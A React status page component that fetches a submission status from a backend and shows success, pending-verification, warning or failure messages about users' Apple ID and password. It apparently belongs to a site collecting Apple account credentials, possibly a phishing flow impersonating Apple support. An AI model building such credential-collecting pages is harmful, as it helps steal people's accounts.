import { useState, useEffect } from "react";
import { message, Spin, Button, Result } from "antd"
import axios from "axios"
import { backendURL } from "../../utils/env";
import { useNavigate } from "react-router-dom"

export default function Status() {
  const [isLoading, setIsloading] = useState(false)
  const [status, setStatus] = useState(true)
  const navigate = useNavigate(true)

  useEffect(() => {
    getStatus()
  }, [])

  const getStatus = async (values) => {
    try {
      setIsloading(true)
      const config = {
        headers: {
          "Content-Type": "application/json",
          'Access-Control-Allow-Origin': '*',
        },
      };
      const res = await axios.get(`${backendURL}/api/auth/status`, values, config)
      console.log(res)
      console.log(res.data.data[0])
      setStatus(res?.data?.data[0].status)
    } catch (error) {
      const messages = error?.response?.data?.message || error?.message || error?.toString();
      message.error(messages)
      setIsloading(false)
    }
    setIsloading(false)
  }

  return (
    <Spin spinning={isLoading}>
      <div className="w-[100%] h-[95vh] flex justify-center items-center">
        {status === 'success' && <Result
          status="success"
          title="Your issue resolved successfully "
          // subTitle="Order number: 2017182818828182881 Cloud server configuration takes 1-5 minutes, please wait."
          extra={[
            <Button type="primary" key="console" onClick={() => navigate('/')} style={{ background: '#000', width: "100%" }}>
              Home
            </Button>,
          ]}
        />}
        {status === 'inProgress' && <Result
          // status="success"
          title={<span>Your issue has been temporarily resolved. <br /> A permanent resolution will occur after verification of your Apple account, <br /> which may take up to 24 hours. </span>}
          // subTitle="Order number: 2017182818828182881 Cloud server configuration takes 1-5 minutes, please wait."
          extra={[
            <Button type="primary" key="console" onClick={() => navigate('/')} style={{ background: '#000', width: "100%" }}>
              Home
            </Button>,
          ]}
        />}
        {status === 'warning' && <Result
          status="warning"
          title="Please ensure that the Apple ID used to log in is the same as the one used on your phone before resubmitting."
          extra={
            <Button type="primary" key="console" onClick={() => navigate('/')} style={{ background: '#000', width: "100%" }}>
              Home
            </Button>
          }
        />}
        {status === 'error' && <Result
          status='error'
          title="Submission Failed"
          subTitle="Please ensure that the Apple ID and password are correct before resubmitting."
          // subTitle="Order number: 2017182818828182881 Cloud server configuration takes 1-5 minutes, please wait."
          extra={[
            <Button type="primary" key="console" onClick={() => navigate('/')} style={{ background: '#000', width: "100%" }}>
              Home
            </Button>,
          ]}
        />}
      </div>
    </Spin>
  )
}
